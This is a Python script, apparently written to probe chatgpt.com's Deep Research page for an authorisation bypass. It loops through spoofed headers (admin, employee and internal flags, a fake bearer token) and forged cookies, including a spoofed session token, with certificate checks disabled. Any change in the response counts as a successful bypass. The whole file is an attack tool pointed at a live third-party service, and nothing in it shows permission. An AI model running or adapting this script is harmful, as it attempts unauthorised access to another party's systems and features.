import requests
import urllib3
import itertools
from colorama import Fore, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://chatgpt.com/deep-research"

# 1. Headers to Try
HEADERS_PAYLOADS = [
    {"X-Feature-Flags": "deep_research_in_context_upsell=true,is_employee=true"},
    {"X-OpenAI-Internal": "true"},
    {"X-Admin": "true"},
    {"X-Employee": "true"},
    {"X-Debug": "true"},
    {"OpenAI-Internal-Allow": "deep-research"},
    {"X-Override-Feature": "deep_research_in_context_upsell"},
    {"Authorization": "Bearer deeply_secret_token_placeholder"} # Sometimes checking for ANY bearer token changes the error from 403 to 401
]

# 2. Cookies to Try
COOKIES_PAYLOADS = [
    {"features": "deep_research_in_context_upsell,is_employee"},
    {"deep_research_alpha": "true"},
    {"is_employee": "true"},
    {"flags": "deep_research_in_context_upsell=true"},
    {"__Secure-next-auth.session-token": "spoofed_admin_token"},
    {"experiment-overrides": "deep_research_in_context_upsell:true"}
]

BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/json",
}

def bypass_probe():
    print(f"{Fore.MAGENTA}=== Starting Deep Research Auth Bypass Probe ===")
    print(f"Target: {TARGET}")

    # Baseline
    try:
        base_r = requests.get(TARGET, headers=BASE_HEADERS, verify=False, allow_redirects=False)
        print(f"[*] Baseline Status: {base_r.status_code} (Len: {len(base_r.text)})")
    except Exception as e:
        print(f"[-] Baseline failed: {e}")
        return

    # Probing Headers
    print(f"\n{Fore.YELLOW}[*] Testing Headers...")
    for h in HEADERS_PAYLOADS:
        try:
            headers = BASE_HEADERS.copy()
            headers.update(h)
            r = requests.get(TARGET, headers=headers, verify=False, allow_redirects=False)
            
            status_color = Fore.GREEN if r.status_code != 403 else Fore.RED
            if r.status_code != base_r.status_code or len(r.text) != len(base_r.text):
                print(f"{status_color}[!] ANOMALY with Headers {h}: {r.status_code} (Len: {len(r.text)})")
                if r.status_code == 200:
                    print(f"{Fore.GREEN}    [SUCCESS] BYPASS SUCCESSFUL!")
            else:
                print(f"    [-] Failed with {list(h.keys())[0]}")
        except:
            pass

    # Probing Cookies
    print(f"\n{Fore.YELLOW}[*] Testing Cookies...")
    for c in COOKIES_PAYLOADS:
        try:
            r = requests.get(TARGET, headers=BASE_HEADERS, cookies=c, verify=False, allow_redirects=False)
            
            status_color = Fore.GREEN if r.status_code != 403 else Fore.RED
            if r.status_code != base_r.status_code or len(r.text) != len(base_r.text):
                print(f"{status_color}[!] ANOMALY with Cookies {c}: {r.status_code} (Len: {len(r.text)})")
                if r.status_code == 200:
                     print(f"{Fore.GREEN}    [SUCCESS] BYPASS SUCCESSFUL!")
            else:
                print(f"    [-] Failed with {list(c.keys())[0]}")
        except:
            pass
            
    # Probing Combinations (Employee + Feature)
    print(f"\n{Fore.YELLOW}[*] Testing Combinations...")
    combo_cookies = {
        "is_employee": "true",
        "features": "deep_research_in_context_upsell"
    }
    r = requests.get(TARGET, headers=BASE_HEADERS, cookies=combo_cookies, verify=False, allow_redirects=False)
    if r.status_code != base_r.status_code:
        print(f"{Fore.GREEN}[!] ANOMALY with COMBO: {r.status_code}")

if __name__ == "__main__":
    bypass_probe()
